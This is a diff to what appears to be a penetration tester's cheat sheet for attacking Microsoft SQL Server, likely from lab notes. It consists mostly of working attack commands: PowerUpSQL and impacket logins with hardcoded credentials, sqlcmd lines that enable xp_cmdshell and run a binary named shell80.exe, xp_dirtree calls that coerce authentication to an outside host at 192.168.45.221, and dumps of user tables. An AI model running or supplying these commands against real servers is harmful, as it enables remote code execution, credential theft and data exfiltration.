@@ -11,6 +11,8 @@ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config
 #### PowerUpSQL
 
 ```bash
+Import-Module .\PowerUpSQL.ps1
+Get-SQLInstanceDomain
 Invoke-SQLDumpInfo -Username nagoya-industries.com\svc_mssql -password Nagoya2023 -Verbose
 Get-SQLInstanceLocal -Username nagoya-industries.com\svc_mssql -password Nagoya2023 -Verbose
 Invoke-SQLAudit -Verbose -Instance SQLServer1
@@ -23,7 +25,7 @@ sqlcmd.exe -Q "use master; exec xp_dirtree '\\192.168.45.221\share\test'" -S nag
 ##### Impacket
 
 ````
-impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+impacket-mssqlclient $user:$pass@$ip -windows-auth
 ````
 
 ##### Invoke-RunAs
@@ -133,6 +135,7 @@ select * from movies where CONTAINS (name, '*500*');
 
 ```bash
 SELECT name FROM sys.databases;
+SELECT * FROM master.INFORMATION_SCHEMA.TABLES;
 ```
 ##### Notes
 
@@ -164,7 +167,7 @@ Invoke-SQLAudit -Verbose
 If AD Azure, check out "https://blog.xpnsec.com/azuread-connect-for-redteam/".
 
 sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; exec xp_cmdshell 'whoami'"
-sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'c:\Windows\Tasks\binary443.exe'"
+sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'c:\Windows\Tasks\shell80.exe'"
 sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; exec xp_dirtree '\\192.168.45.221\share\file'"
 sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; select * from umbraco..cmsMember"
 sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; select * from umbraco..sysobjects"umbracoUserLogin umbracoUser umbracoUserGroup
